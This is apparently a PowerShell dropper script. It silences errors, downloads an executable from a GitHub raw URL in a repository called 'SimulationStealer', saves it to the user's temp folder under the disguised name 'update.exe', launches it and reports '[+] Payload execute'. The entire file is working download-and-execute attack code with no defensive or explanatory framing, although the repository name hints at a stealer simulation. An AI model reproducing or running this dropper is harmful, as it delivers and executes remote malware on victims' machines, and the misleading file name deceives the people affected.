$ErrorActionPreference = "SilentlyContinue"

$payloadUrl = "https://raw.githubusercontent.com/asmaerouel/SimulationStealer/main/test.exe"
$payloadPath = "$env:TEMP\update.exe"

Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing
Start-Process -FilePath $payloadPath
Write-Host "[+] Payload execute"